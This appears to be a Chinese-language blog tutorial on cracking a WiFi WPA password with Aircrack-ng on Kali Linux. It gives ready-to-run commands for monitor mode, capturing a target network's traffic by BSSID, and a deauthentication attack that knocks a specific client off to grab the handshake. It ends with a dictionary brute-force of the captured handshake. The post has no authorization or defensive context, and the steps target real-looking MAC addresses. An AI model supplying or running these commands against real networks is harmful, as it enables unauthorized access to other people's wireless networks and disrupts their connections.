---
title: Aircrack-ng 破解WIFI密码
date: 2018-09-20 
tags: kali
layut: post
music: 27968003
---

### 支持监听模式的无线网卡
我这里使用的是**rt3070**
一般**8187**和**3070**的网卡都可以开启监听模式。
![无线网卡](http://da1sy.github.io/assets/images/9-Yue/wifi-1.jpg)
### 1.网卡开启监听模式
> ⚡/home/da1sy # airmon-ng start wlan1

![1](http://da1sy.github.io/assets/images/9-Yue/wifi-2.jpg)
开启监听模式后网卡名子后坠都会更改为mon

### 2.搜索广播中的WIFI
> ⚡/home/da1sy # airodump-ng -a wlan1mon

![2](http://da1sy.github.io/assets/images/9-Yue/wifi-3.jpg)
### 3.对指定的网络进行抓包
> ⚡/home/da1sy/wifi # airodump-ng -w add --bssid 34:96:72:9B:73:7F -c 7 wlan1mon

![3](http://da1sy.github.io/assets/images/9-Yue/wifi-4.jpg)
**-w**是要保存的包名，**--bssid**是目标网络的MAC地质，**-c**是该网络的信道
### 如果抓不到握手包，就用下面命令让目标重新连接网络
> ⚡/home/da1sy/wifi # aireplay-ng -0 5 -a 34:96:72:9B:73:7F  -c 9C:2E:A1:E8:BC:B7 wlan1mon

![4](http://da1sy.github.io/assets/images/9-Yue/wifi-5.jpg)

#### 如果出现 **WPA handshake:34:96:72:9B:73:7F** 就是已经抓到了握握手包，可以继续下一步操作
![5](http://da1sy.github.io/assets/images/9-Yue/wifi-6.jpg)
### 5.开始暴力破解
> ⚡/home/da1sy/wifi # aircrack-ng -w /media/da1sy/软件/DA1SY/password/supper955.txt add-01.cap

#### **-w**后面跟的是字典文件，最后面是抓到的包名
![6](http://da1sy.github.io/assets/images/9-Yue/wifi-00.webm)

最后就是坐等，这个猜解的快慢取决于GPU的运算能力

**最后成功截图**
![7](http://da1sy.github.io/assets/images/9-Yue/wifi-8.png)

